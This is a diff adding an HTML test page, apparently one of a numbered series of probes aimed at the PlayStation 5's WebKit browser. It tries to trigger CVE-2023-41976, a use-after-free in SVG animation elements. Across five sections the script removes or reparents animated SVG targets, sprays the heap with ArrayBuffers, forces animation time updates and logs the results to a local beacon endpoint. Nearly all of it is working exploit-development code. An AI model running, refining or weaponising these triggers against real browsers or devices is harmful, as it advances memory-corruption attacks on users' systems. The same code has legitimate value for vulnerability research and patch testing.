@@ -1,0 +1,390 @@
+<!--
+  p686: CVE-2023-41976 -- SVG animation element UAF
+
+  CVE-2023-41976: UAF fixed with "improved memory management" in Safari 17.1.
+  Found by Junsung Lee (Cross Republic). PS5 has Safari 17.0 -- LIKELY VULNERABLE.
+
+  SVG animation elements (animate, animateTransform, set) hold references to their
+  target elements. If the target is removed mid-animation and the animation element
+  tries to update it, a stale pointer results. WebKit's SVG animation implementation
+  has had multiple UAF bugs in this area.
+
+  Patterns tested:
+  A) Remove animated target element during animation callback
+  B) Remove SVG use-element target while animate references the instance
+  C) animateTransform target removed during compositor update
+  D) SMIL animation with begin/end events on removed elements
+  E) Nested SVG with animation targeting parent that gets reparented
+
+  CRASH_CLASS: MODERATE (stale SVG element pointer)
+  prior art: p684 (DOM mutation UAF), p553 (Canvas2D UAF)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p686</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+function main(){
+  b('P686-START:SVG-ANIMATION-UAF');
+  var results = [];
+
+  // === SECTION A: Remove target during requestAnimationFrame ===
+  b('A:REMOVE-DURING-RAF');
+  try {
+    var svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
+    svg.setAttribute('width', '200');
+    svg.setAttribute('height', '200');
+    document.body.appendChild(svg);
+
+    // Create target rect with animation
+    var rect = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
+    rect.setAttribute('id', 'target-a');
+    rect.setAttribute('width', '100');
+    rect.setAttribute('height', '100');
+    rect.setAttribute('fill', 'blue');
+    svg.appendChild(rect);
+
+    var anim = document.createElementNS('http://www.w3.org/2000/svg', 'animate');
+    anim.setAttribute('href', '#target-a');
+    anim.setAttribute('attributeName', 'width');
+    anim.setAttribute('from', '100');
+    anim.setAttribute('to', '0');
+    anim.setAttribute('dur', '0.1s');
+    anim.setAttribute('fill', 'freeze');
+    anim.setAttribute('begin', '0s');
+    svg.appendChild(anim);
+
+    // Remove target during animation
+    var animRef = anim;
+    var rectRef = rect;
+    setTimeout(function() {
+      // Remove the target while animation is running
+      rectRef.remove();
+      b('A:TARGET-REMOVED');
+
+      // GC + spray
+      for (var i = 0; i < 3000; i++) new ArrayBuffer(1024);
+      var spray = [];
+      for (var i = 0; i < 1024; i++) spray.push(new ArrayBuffer(64));
+
+      // Try to access animation's target
+      try {
+        var target = animRef.targetElement;
+        b('A:TARGET-ELEMENT:' + (target ? target.tagName : 'null'));
+        if (target && target.parentNode === null) {
+          b('A:STALE-TARGET');
+          results.push('A:stale');
+        }
+      } catch(e2) {
+        b('A:TARGET-ERR:' + e2.message);
+        results.push('A:err');
+      }
+
+      // Force the animation to try to update
+      try {
+        svg.setCurrentTime(0.05);
+        b('A:SET-TIME-OK');
+      } catch(e2) {
+        b('A:SET-TIME-ERR:' + e2.message);
+      }
+
+      svg.remove();
+      runSectionB();
+    }, 50);
+  } catch(e) {
+    b('A:ERR:' + e.message);
+    runSectionB();
+  }
+
+  function runSectionB() {
+    // === SECTION B: Use element + animation on removed def ===
+    b('B:USE-ANIM-REMOVED');
+    try {
+      var svg2 = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
+      svg2.setAttribute('width', '200');
+      svg2.setAttribute('height', '200');
+      document.body.appendChild(svg2);
+
+      var defs = document.createElementNS('http://www.w3.org/2000/svg', 'defs');
+      var circle = document.createElementNS('http://www.w3.org/2000/svg', 'circle');
+      circle.setAttribute('id', 'def-b');
+      circle.setAttribute('r', '40');
+      circle.setAttribute('fill', 'green');
+      defs.appendChild(circle);
+      svg2.appendChild(defs);
+
+      // Animate the def element
+      var anim2 = document.createElementNS('http://www.w3.org/2000/svg', 'animate');
+      anim2.setAttribute('href', '#def-b');
+      anim2.setAttribute('attributeName', 'r');
+      anim2.setAttribute('from', '40');
+      anim2.setAttribute('to', '10');
+      anim2.setAttribute('dur', '0.1s');
+      anim2.setAttribute('begin', '0s');
+      svg2.appendChild(anim2);
+
+      // Use element references the def
+      var use = document.createElementNS('http://www.w3.org/2000/svg', 'use');
+      use.setAttributeNS('http://www.w3.org/1999/xlink', 'href', '#def-b');
+      use.setAttribute('x', '100');
+      use.setAttribute('y', '100');
+      svg2.appendChild(use);
+
+      setTimeout(function() {
+        // Remove the def while animation targets it
+        circle.remove();
+        b('B:DEF-REMOVED');
+
+        // GC + spray
+        for (var i = 0; i < 3000; i++) new ArrayBuffer(1024);
+        var spray2 = [];
+        for (var i = 0; i < 1024; i++) spray2.push(new ArrayBuffer(48));
+
+        // Force animation update
+        try {
+          svg2.setCurrentTime(0.05);
+          b('B:SET-TIME-OK');
+        } catch(e2) {
+          b('B:SET-TIME-ERR:' + e2.message);
+        }
+
+        // Check use element state
+        try {
+          var inst = use.instanceRoot;
+          b('B:INSTANCE:' + (inst ? 'exists' : 'null'));
+        } catch(e2) {
+          b('B:INSTANCE-ERR:' + e2.message);
+          results.push('B:err');
+        }
+
+        svg2.remove();
+        runSectionC();
+      }, 50);
+    } catch(e) {
+      b('B:ERR:' + e.message);
+      runSectionC();
+    }
+  }
+
+  function runSectionC() {
+    // === SECTION C: animateTransform during reparent ===
+    b('C:TRANSFORM-REPARENT');
+    try {
+      var svg3 = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
+      svg3.setAttribute('width', '200');
+      svg3.setAttribute('height', '200');
+      document.body.appendChild(svg3);
+
+      var g1 = document.createElementNS('http://www.w3.org/2000/svg', 'g');
+      g1.setAttribute('id', 'group-c');
+      var rect3 = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
+      rect3.setAttribute('width', '50');
+      rect3.setAttribute('height', '50');
+      rect3.setAttribute('fill', 'red');
+      g1.appendChild(rect3);
+      svg3.appendChild(g1);
+
+      var animT = document.createElementNS('http://www.w3.org/2000/svg', 'animateTransform');
+      animT.setAttribute('href', '#group-c');
+      animT.setAttribute('attributeName', 'transform');
+      animT.setAttribute('type', 'rotate');
+      animT.setAttribute('from', '0');
+      animT.setAttribute('to', '360');
+      animT.setAttribute('dur', '0.1s');
+      animT.setAttribute('begin', '0s');
+      svg3.appendChild(animT);
+
+      setTimeout(function() {
+        // Reparent the group to a new SVG (removes from original)
+        var svg3b = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
+        svg3b.setAttribute('width', '200');
+        svg3b.setAttribute('height', '200');
+        document.body.appendChild(svg3b);
+
+        svg3b.appendChild(g1); // reparent
+        b('C:REPARENTED');
+
+        // GC + spray
+        for (var i = 0; i < 3000; i++) new ArrayBuffer(1024);
+        var spray3 = [];
+        for (var i = 0; i < 1024; i++) spray3.push(new ArrayBuffer(48));
+
+        // Original animation still references the group by id in old SVG
+        try {
+          svg3.setCurrentTime(0.05);
+          b('C:OLD-SVG-TIME-OK');
+        } catch(e2) {
+          b('C:OLD-SVG-TIME-ERR:' + e2.message);
+        }
+
+        // Check if animation still resolves
+        try {
+          var t = animT.targetElement;
+          b('C:TARGET:' + (t ? t.tagName + ':id=' + t.id : 'null'));
+        } catch(e2) {
+          b('C:TARGET-ERR:' + e2.message);
+          results.push('C:err');
+        }
+
+        svg3.remove();
+        svg3b.remove();
+        runSectionD();
+      }, 50);
+    } catch(e) {
+      b('C:ERR:' + e.message);
+      runSectionD();
+    }
+  }
+
+  function runSectionD() {
+    // === SECTION D: SMIL begin/end events on removed elements ===
+    b('D:SMIL-EVENTS');
+    try {
+      var svg4 = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
+      svg4.setAttribute('width', '200');
+      svg4.setAttribute('height', '200');
+      document.body.appendChild(svg4);
+
+      // Create multiple interlinked animations
+      var r1 = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
+      r1.setAttribute('id', 'r1-d');
+      r1.setAttribute('width', '50');
+      r1.setAttribute('height', '50');
+      r1.setAttribute('fill', 'purple');
+      svg4.appendChild(r1);
+
+      var a1 = document.createElementNS('http://www.w3.org/2000/svg', 'animate');
+      a1.setAttribute('id', 'a1-d');
+      a1.setAttribute('href', '#r1-d');
+      a1.setAttribute('attributeName', 'width');
+      a1.setAttribute('from', '50');
+      a1.setAttribute('to', '0');
+      a1.setAttribute('dur', '0.05s');
+      a1.setAttribute('begin', '0s');
+      a1.setAttribute('fill', 'freeze');
+      svg4.appendChild(a1);
+
+      // Second animation begins when first ends
+      var a2 = document.createElementNS('http://www.w3.org/2000/svg', 'animate');
+      a2.setAttribute('id', 'a2-d');
+      a2.setAttribute('href', '#r1-d');
+      a2.setAttribute('attributeName', 'height');
+      a2.setAttribute('from', '50');
+      a2.setAttribute('to', '0');
+      a2.setAttribute('dur', '0.05s');
+      a2.setAttribute('begin', 'a1-d.end');
+      a2.setAttribute('fill', 'freeze');
+      svg4.appendChild(a2);
+
+      setTimeout(function() {
+        // Remove the target rect before second animation begins
+        r1.remove();
+        b('D:TARGET-REMOVED-BEFORE-CHAIN');
+
+        // GC + spray
+        for (var i = 0; i < 3000; i++) new ArrayBuffer(1024);
+        var spray4 = [];
+        for (var i = 0; i < 1024; i++) spray4.push(new ArrayBuffer(48));
+
+        // Advance time past first animation end to trigger chained begin
+        try {
+          svg4.setCurrentTime(0.1);
+          b('D:ADVANCED-PAST-CHAIN:OK');
+        } catch(e2) {
+          b('D:CHAIN-ERR:' + e2.message);
+          results.push('D:err');
+        }
+
+        svg4.remove();
+        runSectionE();
+      }, 30);
+    } catch(e) {
+      b('D:ERR:' + e.message);
+      runSectionE();
+    }
+  }
+
+  function runSectionE() {
+    // === SECTION E: Nested SVG animation targeting reparented parent ===
+    b('E:NESTED-REPARENT');
+    try {
+      var outer = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
+      outer.setAttribute('width', '200');
+      outer.setAttribute('height', '200');
+      document.body.appendChild(outer);
+
+      var inner = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
+      inner.setAttribute('id', 'inner-e');
+      inner.setAttribute('x', '10');
+      inner.setAttribute('y', '10');
+      inner.setAttribute('width', '100');
+      inner.setAttribute('height', '100');
+
+      var circ = document.createElementNS('http://www.w3.org/2000/svg', 'circle');
+      circ.setAttribute('cx', '50');
+      circ.setAttribute('cy', '50');
+      circ.setAttribute('r', '30');
+      circ.setAttribute('fill', 'orange');
+      inner.appendChild(circ);
+
+      // Animation inside inner SVG targeting inner SVG's attribute
+      var animX = document.createElementNS('http://www.w3.org/2000/svg', 'animate');
+      animX.setAttribute('href', '#inner-e');
+      animX.setAttribute('attributeName', 'x');
+      animX.setAttribute('from', '10');
+      animX.setAttribute('to', '90');
+      animX.setAttribute('dur', '0.1s');
+      animX.setAttribute('begin', '0s');
+      inner.appendChild(animX);
+
+      outer.appendChild(inner);
+
+      setTimeout(function() {
+        // Rapidly remove inner, clear outer, re-add inner to different parent
+        outer.removeChild(inner);
+        outer.innerHTML = '';
+        b('E:INNER-REMOVED');
+
+        // GC + spray
+        for (var i = 0; i < 3000; i++) new ArrayBuffer(1024);
+        var spray5 = [];
+        for (var i = 0; i < 1024; i++) spray5.push(new ArrayBuffer(64));
+
+        // Try to re-add the detached inner to a fresh SVG
+        var outer2 = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
+        outer2.setAttribute('width', '200');
+        outer2.setAttribute('height', '200');
+        document.body.appendChild(outer2);
+
+        try {
+          outer2.appendChild(inner);
+          b('E:RE-ADDED');
+          outer2.setCurrentTime(0.05);
+          b('E:TIME-SET-OK');
+        } catch(e2) {
+          b('E:RE-ADD-ERR:' + e2.message);
+          results.push('E:err');
+        }
+
+        outer.remove();
+        outer2.remove();
+        finish();
+      }, 50);
+    } catch(e) {
+      b('E:ERR:' + e.message);
+      finish();
+    }
+  }
+
+  function finish() {
+    if (results.length > 0) {
+      b('P686-RESULT:HITS=' + results.join(';'));
+    } else {
+      b('P686-RESULT:NO-UAF-DETECTED');
+    }
+    b('P686-DONE');
+  }
+}
+
+setTimeout(main, 200);
+</script>
+</head><body style="margin:0"><pre id="log">p686: SVG animation element UAF</pre></body></html>
